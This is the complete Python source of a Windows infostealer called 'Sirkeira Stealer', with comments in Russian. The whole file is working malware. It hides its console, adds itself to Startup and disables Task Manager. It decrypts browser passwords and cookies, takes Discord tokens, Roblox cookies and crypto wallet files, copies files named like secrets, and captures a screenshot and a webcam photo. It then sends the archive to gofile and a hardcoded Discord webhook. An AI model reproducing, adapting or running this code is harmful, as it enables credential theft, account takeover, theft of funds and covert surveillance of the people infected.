import shutil, requests, platform, socket, getpass, psutil, browser_cookie3, os, re, sys, subprocess, ctypes, json, base64, sqlite3, zipfile, random, cv2, time, concurrent.futures
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from win32crypt import CryptUnprotectData
from Cryptodome.Cipher import AES
from contextlib import suppress
from pathlib import Path

# Скрытие консоли
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
sys.stdout = open(os.devnull, 'w')
sys.stderr = open(os.devnull, 'w')

class Paths:
    def __init__(self):
        self.temp = Path(os.environ["TEMP"])
        self.userprofile = Path(os.environ["USERPROFILE"])
        self.appdata_local = Path(os.environ["LOCALAPPDATA"])
        self.appdata_roaming = Path(os.environ["APPDATA"])

class Malware:
    def __init__(self):
        self.zip_name = f"SK_{random.randint(10000000000, 99999999999)}.zip"
        self.webhook_url = "https://discord.com/api/webhooks/1465705510253629737/z7nr4m7gqZkafvaxzHrOhH5WfGJDJ0XEHkwL8Dg-dpOuE5eclPb2JfyT3YkuknUj_XDm"
        self.browser_infos = ["extentions", "passwords", "cookies", "history", "downloads", "cards"]
        self.session_files = ["Wallets", "Game Launchers", "Apps"]
        self.task_manager_blocked = False
    
    def delete_file(self, file_path):
        try:
            if os.path.isfile(file_path):
                os.remove(file_path)
            elif os.path.isdir(file_path):
                shutil.rmtree(file_path)
        except: pass

    def startup_persistence(self):
        try:
            src = sys.executable if hasattr(sys, 'frozen') else sys.argv[0]
            dst_dir = os.path.join(Paths().appdata_roaming, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            dst = os.path.join(dst_dir, os.path.basename(src))
            if not os.path.exists(dst):
                shutil.copy2(src, dst)
        except: pass

    def block_task_manager(self):
        try:
            key = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
            hkey = ctypes.c_void_p()
            result = ctypes.windll.advapi32.RegCreateKeyExW(0x80000002, key, 0, None, 0, 0xF003F, None, ctypes.byref(hkey), None)
            if result == 0:
                value = ctypes.c_uint32(1)
                ctypes.windll.advapi32.RegSetValueExW(hkey, "DisableTaskMgr", 0, 4, ctypes.byref(value), 4)
                ctypes.windll.advapi32.RegCloseKey(hkey)
        except: pass

    def unblock_task_manager(self):
        try:
            key = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
            hkey = ctypes.c_void_p()
            result = ctypes.windll.advapi32.RegCreateKeyExW(0x80000002, key, 0, None, 0, 0xF003F, None, ctypes.byref(hkey), None)
            if result == 0:
                value = ctypes.c_uint32(0)
                ctypes.windll.advapi32.RegSetValueExW(hkey, "DisableTaskMgr", 0, 4, ctypes.byref(value), 4)
                ctypes.windll.advapi32.RegCloseKey(hkey)
        except: pass

    def send_webhook(self, gofile_url=None, file_path=None):
        try:
            embed = {
                "title": "• Basic system infos:",
                "color": 0xE53935,
                "fields": [
                    {"name": "Hostname:", "value": f"```{socket.gethostname()}```", "inline": True},
                    {"name": "Username:", "value": f"```{getpass.getuser()}```", "inline": True},
                    {"name": "Machine:", "value": f"```{platform.machine()}```", "inline": True},
                    {"name": "System:", "value": f"```{platform.system()}```", "inline": True},
                    {"name": "Release:", "value": f"```{platform.release()}```", "inline": True},
                    {"name": "Version:", "value": f"```{platform.version()}```", "inline": True},
                ],
                "footer": {"text": "• God's in his heaven. All's right with the world. | @CirqueiraDev"}
            }

            components = [{"type": 1, "components": [
                {"type": 2, "style": 5, "label": "Download File", "url": gofile_url},
                {"type": 2, "style": 5, "label": "Github", "url": "https://github.com/CirqueiraDev"}
            ]}]

            payload = {"username": "Sirkeira Stealer", "embeds": [embed], "components": components}

            if file_path and os.path.exists(file_path):
                with open(file_path, "rb") as f:
                    requests.post(self.webhook_url + "?with_components=true", 
                                data={"payload_json": json.dumps(payload)}, 
                                files={"file": (os.path.basename(file_path), f)})
            else:
                requests.post(self.webhook_url + "?with_components=true", json=payload)
        except: pass

    def upload_gofile(self, file_path):
        try:
            with open(file_path, "rb") as f:
                response = requests.post("https://upload.gofile.io/uploadFile", files={"file": f}, timeout=30)
                if response.status_code == 200:
                    result = response.json()
                    if result.get("status") == "ok":
                        return result["data"]["downloadPage"]
        except: pass
        return None

    def start_stealer(self, zip_file):
        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
                futures = [
                    executor.submit(StealerFunctions.System_Infos, zip_file),
                    executor.submit(StealerFunctions.Discord_Tokens, zip_file),
                    executor.submit(StealerFunctions.Roblox_Cookies, zip_file),
                    executor.submit(StealerFunctions.Interesting_Files, zip_file),
                    executor.submit(StealerFunctions.AntiVirus_Infos, zip_file),
                    executor.submit(StealerFunctions.Screenshot, zip_file),
                    executor.submit(StealerFunctions.Webcam, zip_file)
                ]
                
                # Браузеры и сессии запускаем последовательно для безопасности
                browser_future = executor.submit(StealerFunctions.Browser_Infos, zip_file, self.browser_infos)
                session_future = executor.submit(StealerFunctions.Session_files, zip_file, self.session_files)
                
                # Ждем завершения всех задач
                concurrent.futures.wait(futures + [browser_future, session_future])
            return True
        except: return False

    def main(self):
        try:
            self.startup_persistence()
            if platform.system().lower() != "windows":
                return
            
            # Быстрая проверка интернета
            try:
                requests.get("https://www.google.com", timeout=3)
            except: return
            
            if ctypes.windll.shell32.IsUserAnAdmin():
                self.block_task_manager()
                self.task_manager_blocked = True

            zip_file_path = os.path.join(Paths().temp, self.zip_name)
            with zipfile.ZipFile(zip_file_path, "w", zipfile.ZIP_DEFLATED) as zip_file:
                if self.start_stealer(zip_file):
                    gofile_url = self.upload_gofile(zip_file_path)
                    self.send_webhook(gofile_url=gofile_url, file_path=None if gofile_url else zip_file_path)
            
            self.delete_file(zip_file_path)
            
            if self.task_manager_blocked:
                self.unblock_task_manager()
        except: pass

class StealerFunctions:
    @staticmethod
    def System_Infos(zip_file):
        try:
            cpu_count = psutil.cpu_count(logical=True)
            ram_total = round(psutil.virtual_memory().total / (1024**3), 2)
            disk_usage = psutil.disk_usage('/').percent
            
            ip_info = ''
            try:
                eva = requests.get("https://ipwhois.app/json/", timeout=5).json()
                ip_info = '\n'.join([f"    - {i:<20}: {eva[i]}" for i in eva])
            except: pass
            
            net_info = ''
            interfaces = psutil.net_if_addrs()
            for iface, addr_list in interfaces.items():
                for addr in addr_list:
                    if addr.family == socket.AF_INET:
                        net_info += f"    - {iface:<20} : {addr.address}\n"

            system_infos = f"""System infos:
    - hostname      : {socket.gethostname()}
    - username      : {getpass.getuser()}
    - processor     : {platform.processor()}
    - machine       : {platform.machine()}
    - platform      : {platform.platform()}
    - system        : {platform.system()}
    - release       : {platform.release()}
    - version       : {platform.version()}
    - CPU cores     : {cpu_count}
    - RAM total(GB) : {ram_total}
    - Disk usage(%) : {disk_usage}
    - local IP      : {socket.gethostbyname(socket.gethostname())}

Network interfaces:
{net_info}
Public IP infos:
{ip_info if ip_info else 'No IP infos.'}"""
            zip_file.writestr("system_infos.txt", system_infos)
            return True
        except: 
            zip_file.writestr("system_infos.txt", "No infos.")
            return False

    @staticmethod
    def Roblox_Cookies(zip_file):
        cookie_list = []
        file_content = ""
        
        def get_cookie(cookies):
            try:
                cookie_str = str(cookies)
                if ".ROBLOSECURITY=" in cookie_str:
                    return cookie_str.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            except: pass
            return None

        for browser_func in [browser_cookie3.chrome, browser_cookie3.edge, browser_cookie3.firefox, 
                           browser_cookie3.opera, browser_cookie3.brave]:
            try:
                cookies = browser_func(domain_name=".roblox.com")
                cookie = get_cookie(cookies)
                if cookie and cookie not in cookie_list:
                    cookie_list.append(cookie)
                    try:
                        info = requests.get("https://users.roblox.com/v1/users/authenticated",
                                          cookies={".ROBLOSECURITY": cookie}, timeout=5).json()
                    except: info = {}
                    
                    file_content += f"""Roblox Account n°{len(cookie_list)}:
- Navigator     : {browser_func.__name__}
    - Id            : {info.get('id', 'None')}
    - Username      : {info.get('name', 'None')}
    - DisplayName   : {info.get('displayName', 'None')}
    - Cookie        : {cookie}
"""
            except: continue

        if not file_content:
            file_content = "No roblox cookie found."
        
        zip_file.writestr(f"Roblox Accounts ({len(cookie_list)}).txt", file_content)
        return len(cookie_list)

    @staticmethod
    def Discord_Tokens(zip_file):
        def get_master_key(path):
            try:
                with open(path, "r", encoding="utf-8") as f:
                    local_state = json.load(f)
                encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                return CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            except: return None

        def decrypt_val(buff, master_key):
            try:
                iv = buff[3:15]
                payload = buff[15:]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                return cipher.decrypt(payload)[:-16].decode()
            except: return None

        tokens = []
        uids = []
        file_content = ""
        
        path_appdata_local = Paths().appdata_local
        path_appdata_roaming = Paths().appdata_roaming
        
        # Основные пути для поиска токенов
        search_paths = [
            (os.path.join(path_appdata_roaming, "discord", "Local Storage", "leveldb"), "discord"),
            (os.path.join(path_appdata_roaming, "discordcanary", "Local Storage", "leveldb"), "discordcanary"),
            (os.path.join(path_appdata_roaming, "discordptb", "Local Storage", "leveldb"), "discordptb"),
            (os.path.join(path_appdata_local, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"), ""),
            (os.path.join(path_appdata_local, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"), ""),
        ]

        regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        regexp_enc = r"dQw4w9WgXcQ:[^\"]*"

        for path, app_name in search_paths:
            if not os.path.exists(path):
                continue
                
            try:
                for file_name in os.listdir(path):
                    if not file_name.endswith((".log", ".ldb")):
                        continue
                        
                    file_path = os.path.join(path, file_name)
                    try:
                        with open(file_path, errors='ignore') as f:
                            content = f.read()
                            
                        if app_name and "cord" in app_name:
                            master_key = get_master_key(os.path.join(path_appdata_roaming, app_name, 'Local State'))
                            if master_key:
                                for match in re.findall(regexp_enc, content):
                                    try:
                                        token = decrypt_val(base64.b64decode(match.split('dQw4w9WgXcQ:')[1]), master_key)
                                        if token and token not in tokens:
                                            response = requests.get("https://discord.com/api/v9/users/@me", 
                                                                  headers={'Authorization': token}, timeout=5)
                                            if response.status_code == 200:
                                                tokens.append(token)
                                                uids.append(response.json()['id'])
                                    except: continue
                        else:
                            for token in re.findall(regexp, content):
                                if token not in tokens:
                                    response = requests.get("https://discord.com/api/v9/users/@me", 
                                                          headers={'Authorization': token}, timeout=5)
                                    if response.status_code == 200:
                                        tokens.append(token)
                                        uids.append(response.json()['id'])
                    except: continue
            except: continue

        # Обработка найденных токенов
        for i, token in enumerate(tokens, 1):
            try:
                api = requests.get('https://discord.com/api/v8/users/@me', 
                                 headers={'Authorization': token}, timeout=5).json()
            except: api = {}

            file_content += f"""
Discord Account n°{i}:
- Token           : {token}
- Username        : {api.get('username', 'None')}#{api.get('discriminator', 'None')}
- Display Name    : {api.get('global_name', 'None')}
- Id              : {api.get('id', 'None')}
- Email           : {api.get('email', 'None')}
- Email Verified  : {api.get('verified', 'None')}
- Phone           : {api.get('phone', 'None')}
- Nitro           : {'Nitro Classic' if api.get('premium_type') == 1 else 'Nitro Boosts' if api.get('premium_type') == 2 else 'Nitro Basic' if api.get('premium_type') == 3 else 'False'}
- Language        : {api.get('locale', 'None')}
"""
        
        if not file_content:
            file_content = "No discord tokens found."
        
        zip_file.writestr(f"Discord Accounts ({len(tokens)}).txt", file_content)
        return len(tokens)

    @staticmethod
    def Interesting_Files(zip_file):
        keywords = [
            "password", "pass", "login", "account", "bank", "crypto", "bitcoin", "wallet", 
            "seed", "private", "key", "token", "secret", "backup", "2fa", "mfa", "otp",
            "discord", "telegram", "whatsapp", "metamask", "exodus", "trustwallet"
        ]
        
        extensions = ('.txt', '.json', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.csv', '.log', '.ini', '.cfg')
        paths = [
            str(Paths().userprofile / "Desktop"),
            str(Paths().userprofile / "Downloads"),
            str(Paths().userprofile / "Documents"),
            str(Paths().appdata_roaming / "Microsoft" / "Windows" / "Recent")
        ]
        
        found_files = 0
        
        for path in paths:
            if not os.path.exists(path):
                continue
                
            for root, dirs, files in os.walk(path):
                for file in files:
                    if file.lower().endswith(extensions):
                        file_lower = file.lower()
                        if any(keyword in file_lower for keyword in keywords):
                            try:
                                full_path = os.path.join(root, file)
                                zip_file.write(full_path, f"Interesting Files/{file}_{random.randint(1, 9999)}")
                                found_files += 1
                            except: continue
        
        return found_files

    @staticmethod 
    def Browser_Infos(zip_file, browser_choice):
        def get_master_key(path):
            try:
                with open(path, 'r', encoding='utf-8') as f:
                    local_state = json.load(f)
                encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                return CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            except: return None

        def decrypt(buff, master_key):
            try:
                iv = buff[3:15]
                payload = buff[15:-16]
                tag = buff[-16:]
                cipher = Cipher(algorithms.AES(master_key), modes.GCM(iv, tag))
                decryptor = cipher.decryptor()
                return (decryptor.update(payload) + decryptor.finalize()).decode()
            except: return None

        def process_browser(name, path):
            if not os.path.exists(path):
                return [], [], [], [], []
                
            passwords = []
            cookies = []
            history = []
            downloads = []
            cards = []
            
            master_key = get_master_key(os.path.join(path, 'Local State'))
            if not master_key:
                return passwords, cookies, history, downloads, cards

            # Пароли
            if "passwords" in browser_choice:
                try:
                    login_db = os.path.join(path, 'Login Data')
                    if os.path.exists(login_db):
                        conn = sqlite3.connect(login_db)
                        cursor = conn.cursor()
                        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
                        for row in cursor.fetchall():
                            if row[0] and row[1] and row[2]:
                                decrypted = decrypt(row[2], master_key)
                                if decrypted:
                                    passwords.append(f"- Url: {row[0]}\n  Username: {row[1]}\n  Password: {decrypted}\n  Browser: {name}\n")
                        conn.close()
                except: pass

            # Куки
            if "cookies" in browser_choice:
                try:
                    cookie_db = os.path.join(path, 'Network', 'Cookies')
                    if os.path.exists(cookie_db):
                        conn = sqlite3.connect(cookie_db)
                        cursor = conn.cursor()
                        cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')
                        for row in cursor.fetchall():
                            if row[0] and row[1] and row[2]:
                                decrypted = decrypt(row[2], master_key)
                                if decrypted:
                                    cookies.append(f"- Url: {row[0]}\n  Name: {row[1]}\n  Cookie: {decrypted}\n  Browser: {name}\n")
                        conn.close()
                except: pass

            # История
            if "history" in browser_choice:
                try:
                    history_db = os.path.join(path, 'History')
                    if os.path.exists(history_db):
                        conn = sqlite3.connect(history_db)
                        cursor = conn.cursor()
                        cursor.execute('SELECT url, title FROM urls LIMIT 100')
                        for row in cursor.fetchall():
                            if row[0]:
                                history.append(f"- Url: {row[0]}\n  Title: {row[1] if row[1] else 'N/A'}\n  Browser: {name}\n")
                        conn.close()
                except: pass

            return passwords, cookies, history, downloads, cards

        # Основные браузеры
        browsers = [
            ("Chrome", os.path.join(Paths().appdata_local, "Google", "Chrome", "User Data", "Default")),
            ("Edge", os.path.join(Paths().appdata_local, "Microsoft", "Edge", "User Data", "Default")),
            ("Brave", os.path.join(Paths().appdata_local, "BraveSoftware", "Brave-Browser", "User Data", "Default")),
        ]

        all_passwords = []
        all_cookies = []
        all_history = []
        
        for name, path in browsers:
            passwords, cookies, history, downloads, cards = process_browser(name, path)
            all_passwords.extend(passwords)
            all_cookies.extend(cookies)
            all_history.extend(history)

        # Запись в ZIP
        if all_passwords:
            zip_file.writestr(f"Passwords ({len(all_passwords)}).txt", "\n".join(all_passwords) if all_passwords else "No passwords found.")
        if all_cookies:
            zip_file.writestr(f"Cookies ({len(all_cookies)}).txt", "\n".join(all_cookies) if all_cookies else "No cookies found.")
        if all_history:
            zip_file.writestr(f"Browsing History ({len(all_history)}).txt", "\n".join(all_history) if all_history else "No history found.")

        return len(all_passwords), len(all_cookies), len(all_history), 0, 0

    @staticmethod
    def AntiVirus_Infos(zip_file):
        common_av_paths = [
            "C:\\Program Files\\Avast Software\\Avast",
            "C:\\Program Files\\AVG\\Antivirus",
            "C:\\Program Files\\Avira\\Launcher",
            "C:\\Program Files\\Bitdefender Antivirus Free",
            "C:\\Program Files\\Kaspersky Lab",
            "C:\\Program Files\\McAfee",
            "C:\\Program Files\\Norton Security",
            "C:\\Program Files\\ESET\\ESET Security",
            "C:\\Program Files\\Windows Defender",
            "C:\\Program Files\\Malwarebytes",
        ]
        
        found = []
        for path in common_av_paths:
            if os.path.exists(path):
                found.append(os.path.basename(path))
        
        info = "Antivirus software found:\n- " + "\n- ".join(found) if found else "No antivirus software found."
        zip_file.writestr("Antivirus Info.txt", info)
        return len(found)

    @staticmethod
    def Session_files(zip_file, session_files_choice):
        found_wallets = []
        
        # Быстрая проверка популярных кошельков
        wallet_paths = [
            ("Exodus", os.path.join(Paths().appdata_roaming, "Exodus")),
            ("Atomic", os.path.join(Paths().appdata_roaming, "atomic")),
            ("Binance", os.path.join(Paths().appdata_roaming, "Binance")),
            ("Electrum", os.path.join(Paths().appdata_roaming, "Electrum")),
            ("Trust Wallet", os.path.join(Paths().appdata_roaming, "Trust Wallet")),
        ]
        
        for name, path in wallet_paths:
            if os.path.exists(path) and "Wallets" in session_files_choice:
                found_wallets.append(name)
                try:
                    zip_file.writestr(os.path.join("Session Files", name, "path.txt"), path)
                    # Сохраняем только важные файлы
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if file.endswith(('.json', '.txt', '.log', '.dat', '.wallet')):
                                try:
                                    full_path = os.path.join(root, file)
                                    rel_path = os.path.join("Session Files", name, "Files", os.path.relpath(full_path, path))
                                    zip_file.write(full_path, rel_path)
                                except: pass
                except: pass
        
        return ", ".join(found_wallets) if found_wallets else "No", "No", "No"

    @staticmethod
    def Webcam(zip_file):
        try:
            cap = cv2.VideoCapture(0)
            if cap.isOpened():
                ret, frame = cap.read()
                if ret:
                    temp_path = os.path.join(Paths().temp, "webcam.jpg")
                    cv2.imwrite(temp_path, frame)
                    zip_file.write(temp_path, "Webcam/webcam.jpg")
                    os.remove(temp_path)
                    cap.release()
                    return True
            cap.release()
        except: pass
        return False

    @staticmethod
    def Screenshot(zip_file):
        try:
            import PIL.ImageGrab
            screenshot = PIL.ImageGrab.grab()
            temp_path = os.path.join(Paths().temp, "screenshot.png")
            screenshot.save(temp_path)
            zip_file.write(temp_path, "Screenshot/screenshot.png")
            os.remove(temp_path)
            return True
        except: 
            return False

if __name__ == "__main__":
    malware = Malware()
    malware.main()
